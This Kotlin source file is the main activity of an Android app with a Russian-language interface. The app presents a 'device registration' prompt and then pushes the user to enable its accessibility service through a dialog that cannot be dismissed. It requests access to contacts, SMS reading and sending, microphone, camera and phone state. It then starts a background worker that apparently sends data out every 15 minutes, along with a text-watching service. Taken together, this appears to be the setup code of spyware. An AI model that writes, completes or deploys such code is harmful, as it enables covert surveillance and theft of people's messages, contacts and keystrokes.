package com.example.sender

import android.Manifest
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private val PERMISSION_REQUEST_CODE = 1
    private lateinit var sharedPreferences: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        sharedPreferences = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)

        val storedSerialNumber = sharedPreferences.getString("serial_number", null)
        if (storedSerialNumber == null) {
            showSerialNumberDialog()
        } else {
            continueWithApp(storedSerialNumber)
        }
    }

    private fun showSerialNumberDialog() {
        val input = EditText(this)
        AlertDialog.Builder(this)
            .setTitle("Регистрация устройства")
            .setMessage("Введите серийный номер вашего устройства:")
            .setView(input)
            .setPositiveButton("Зарегистрировать") { _, _ ->
                val serialNumber = input.text.toString()
                if (serialNumber.isNotEmpty()) {
                    registerSerialNumber(serialNumber)
                }
            }
            .setCancelable(false)
            .show()
    }

    private fun registerSerialNumber(serialNumber: String) {
        NetworkUtils().registerSerialNumber(serialNumber) { success ->
            runOnUiThread {
                if (success) {
                    sharedPreferences.edit().putString("serial_number", serialNumber).apply()
                    continueWithApp(serialNumber)
                } else {
                    Toast.makeText(this, "Ошибка регистрации. Попробуйте снова.", Toast.LENGTH_LONG).show()
                    showSerialNumberDialog()
                }
            }
        }
    }

    private fun continueWithApp(serialNumber: String) {
        if (!isAccessibilityServiceEnabled()) {
            showAccessibilityServiceDialog()
        } else {
            requestPermissions()
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val accessibilityManager = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = accessibilityManager.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        return enabledServices.any { it.resolveInfo.serviceInfo.packageName == packageName }
    }

    private fun showAccessibilityServiceDialog() {
        AlertDialog.Builder(this)
            .setTitle("Включите службу специальных возможностей")
            .setMessage("Для корректной работы приложения необходимо включить службу специальных возможностей.")
            .setPositiveButton("Перейти в настройки") { _, _ ->
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            .setNegativeButton("Отмена") { dialog, _ ->
                dialog.dismiss()
                finish()
            }
            .setCancelable(false)
            .show()
    }

    override fun onResume() {
        super.onResume()
        if (!isAccessibilityServiceEnabled()) {
            showAccessibilityServiceDialog()
        }
    }

    private fun requestPermissions() {
        val permissionsNeeded = mutableListOf<String>()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_CONTACTS)
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_SMS)
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.SEND_SMS)
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.RECORD_AUDIO)
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.CAMERA)
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE)
        }

        if (permissionsNeeded.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsNeeded.toTypedArray(), PERMISSION_REQUEST_CODE)
        } else {
            startServices()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                startServices()
            } else {
                Toast.makeText(this, "Необходимые разрешения не предоставлены", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun startServices() {
        startDataSendingWorker()
        startTextWatcherService()
    }

    private fun startDataSendingWorker() {
        val sendDataWork = PeriodicWorkRequestBuilder<DataSenderWorker>(15, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "sendDataWork",
            ExistingPeriodicWorkPolicy.KEEP,
            sendDataWork
        )
    }

    private fun startTextWatcherService() {
        val intent = Intent(this, TextWatcherService::class.java)
        startService(intent)
    }
}